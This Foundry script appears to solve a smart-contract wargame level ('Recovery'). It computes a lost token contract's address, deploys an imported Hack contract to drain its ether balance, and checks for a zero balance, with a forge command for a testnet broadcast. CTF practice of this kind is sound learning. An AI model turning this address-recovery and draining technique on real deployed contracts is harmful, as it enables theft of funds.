// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Recovery, SimpleToken, Hack} from "../src/level17.sol";

contract Level17Script is Script {
    function run(address instanceAddress) external {
        Recovery target = Recovery(instanceAddress);
        address simpleTokenAddress = vm.computeCreateAddress(instanceAddress, 1);
        console.log("address: ", instanceAddress);
        console.log("address: ", simpleTokenAddress);

        SimpleToken token = SimpleToken(payable(simpleTokenAddress));
        uint256 balanceBefore = address(token).balance;
        console.log("SimpleToken balance before: ", balanceBefore);

        vm.startBroadcast();
        Hack hackContract = new Hack();
        hackContract.hack(simpleTokenAddress);
        vm.stopBroadcast();

        uint256 balanceAfter = address(token).balance;
        console.log("SimpleToken balance after: ", balanceAfter);
        console.log("Attack successful: ", balanceAfter == 0);
    }
}
//forge script script/level17.s.sol:Level17Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
